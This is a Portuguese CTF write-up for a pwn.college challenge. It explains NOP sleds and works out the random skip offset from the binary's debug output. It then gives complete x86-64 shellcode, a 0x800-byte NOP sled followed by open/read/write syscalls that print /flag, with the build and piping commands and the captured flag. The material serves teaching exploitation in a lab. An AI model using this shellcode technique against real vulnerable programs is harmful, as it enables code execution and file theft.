# Writeup: pwn.college — Binary Exploitation: NOP Sled Shellcode

## Descrição do Desafio

Similar ao desafio anterior, o binário lê bytes do stdin, copia para a stack e os executa. A diferença é que desta vez o programa **pula aleatoriamente até 0x800 bytes** do shellcode antes de executar:

> *"This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly execute and then your real shellcode will run. This concept is called a `nop sled`."*

---

## Contexto: O que é um NOP Sled?

Um **NOP** (`0x90`) é uma instrução de um byte que não faz nada — o processador simplesmente avança para a próxima instrução. Um **NOP sled** é uma sequência longa de NOPs colocada antes do código real.

A ideia é simples: não importa onde dentro do sled o programa comece a executar, ele vai "deslizar" pelos NOPs até chegar no código real.

```
execução começa em qualquer ponto aqui
         ↓
[NOP NOP NOP NOP NOP NOP ... NOP NOP][código real]
 ↓   ↓   ↓   ↓                  ↓        ↓
 nada nada nada ... nada nada  [open/read/write/exit]
```

---

## Identificando o Offset

Ao enviar um byte qualquer (`A`) como input, o binário revelou onde estava executando e o que interpretou como instrução:

```
Allocated 0x1000 bytes for shellcode on the stack at 0x7fff11c3f140!
...
This challenge is about to execute the following shellcode:

  Address           | Bytes   | Instructions
  0x00007fff11c3f680| 00 10   | add byte ptr [rax], dl
  ...
Segmentation fault
```

O shellcode foi alocado em `0x7fff11c3f140` mas a execução começou em `0x7fff11c3f680`. A diferença:

```
0x7fff11c3f680 - 0x7fff11c3f140 = 0x540
```

Ou seja, nessa execução o programa pulou `0x540` bytes. Como o pulo é aleatório e pode chegar até `0x800`, o NOP sled precisa ter pelo menos `0x800` bytes para cobrir todos os casos.

---

## O Shellcode

```asm
.global _start
_start:
.intel_syntax noprefix
.fill 0x800, 1, 0x90
main:
        #open("/flag", O_RDONLY)
        mov rax, 2
        lea rdi, [rip + flag]
        mov rsi, 0
        mov rdx, 0
        syscall
        mov rdi, rax
        mov rax, 0
        lea rsi, [rip + results]
        mov rdx, 0x100
        syscall
        mov rax, 1
        mov rdi, 1
        lea rsi, [rip + results]
        mov rdx, 0x100
        syscall
        mov rax, 60
        mov rdi, 0
        syscall
flag:
        .string "/flag"
results:
        .space 100
```

**`.fill 0x800, 1, 0x90`** — diretiva do assembler que insere `0x800` bytes de valor `0x90` (opcode do NOP). Não vira instrução de máquina em si — é uma instrução para o assembler durante a compilação preencher aquele espaço. O resultado são 2048 NOPs consecutivos antes do código real.

Não importa onde dentro dos `0x800` bytes o programa comece a executar — ele desliza pelos NOPs e chega em `main`.

---

## Compilação e Execução

```bash
gcc -nostdlib -static -o shellcode shellcode.s
objcopy --dump-section .text=shellcode-raw shellcode
cat shellcode-raw | /challenge/binary-exploitation-nopsled-shellcode
```

> **Atenção:** usar `cat shellcode.s` em vez de `cat shellcode-raw` envia o texto do arquivo assembly, não os bytes compilados — o binário receberia caracteres ASCII em vez de opcodes e falharia.

---

## Resultado

O binário executou os NOPs, deslizou até o código real e imprimiu a flag:

```
pwn.college{AMnyeuCPVpLrtZZ2Fztief9JgA7.dhTMywCOzYTNxEzW}
```

---

## Resumo

| Técnica | Descrição |
|---|---|
| NOP sled | 0x800 bytes de `0x90` antes do código real para absorver o pulo aleatório |
| Direct syscall shellcode | open/read/write sem invocar shell, preservando EUID=0 |
| Position-independent shellcode | `lea [rip + label]` para endereçamento relativo, necessário com ASLR |
